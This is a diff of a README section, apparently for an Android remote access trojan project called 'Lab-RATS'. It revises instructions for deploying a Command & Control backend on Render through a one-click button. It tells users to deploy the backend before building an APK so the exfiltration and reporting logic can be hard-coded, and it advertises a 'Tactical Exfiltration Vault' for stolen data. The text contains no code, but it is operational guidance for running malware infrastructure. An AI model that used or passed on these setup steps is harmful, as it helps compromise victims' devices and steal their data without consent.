@@ -188,9 +188,12 @@ function handleRequest(e) {
 
 ---
 
-## 📡 C2 Backend Infrastructure (Optional)
+## 📡 C2 Backend Infrastructure (One-Click)
 
-Deploy your own private Command & Control hub instantly to manage your fleet and preserve exfiltrated data.
+> [!IMPORTANT]
+> **GET YOUR URL FIRST**: If you plan to use the centralized dashboard, you MUST click the button below and complete the Render deployment **BEFORE** building your APK. The builder will ask for this URL to hard-code the exfiltration and reporting logic.
+
+Deploy your own private Command & Control hub instantly to manage your fleet and preserve exfiltrated data. The backend features a **Glass-Morphism UI**, **Orbitron typography**, and a **Tactical Exfiltration Vault**.
 
 [![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/K4N3CO/Lab-RATS)
 
